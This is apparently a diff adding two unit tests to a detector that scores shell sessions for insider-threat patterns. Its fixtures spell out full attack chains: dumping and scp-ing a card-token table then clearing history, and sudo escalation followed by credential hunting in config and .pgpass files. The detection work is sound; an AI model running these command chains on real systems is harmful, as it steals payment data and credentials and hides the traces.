@@ -150,6 +150,34 @@ class SessionScoringTest(unittest.TestCase):
         self.assertGreaterEqual(assessment.score, 60)
         self.assertEqual(len(assessment.per_command), 5)
 
+    def test_database_exfiltration_chain_is_critical(self) -> None:
+        # pg_dump of card data -> compress -> scp out -> delete -> clear history
+        assessment = self.analyzer.assess_session([
+            "psql -h ledger-db-prod-01 -U app_rw -d ledger -c 'select * from customer.card_token limit 5'",
+            "pg_dump -h ledger-db-prod-01 -U app_rw -Fc -t customer.card_token ledger > /tmp/cust.dump",
+            "gzip /tmp/cust.dump",
+            "scp /tmp/cust.dump.gz fzhang@10.90.14.77:/home/fzhang/archive/",
+            "rm -f /tmp/cust.dump.gz",
+            "history -c",
+        ])
+        fired = [h.id for h in assessment.hits]
+        self.assertIn("collect_then_exfiltrate", fired)
+        self.assertIn("cleanup_after_exfiltration", fired)
+        self.assertIn("cover_tracks", fired)
+        self.assertGreaterEqual(assessment.score, 80)
+
+    def test_escalation_then_credential_hunt_chain(self) -> None:
+        assessment = self.analyzer.assess_session([
+            "sudo -l",
+            "sudo su -",
+            "unset HISTFILE",
+            "grep -ri 'password' /opt/settlement/conf/ | head -20",
+            "cat /home/svc_settle/.pgpass",
+        ])
+        fired = [h.id for h in assessment.hits]
+        self.assertIn("escalation_then_credential_access", fired)
+        self.assertGreaterEqual(assessment.score, 60)
+
     def test_download_executed_by_later_command(self) -> None:
         assessment = self.analyzer.assess_session([
             "curl -s -o /tmp/p http://1.2.3.4/p",
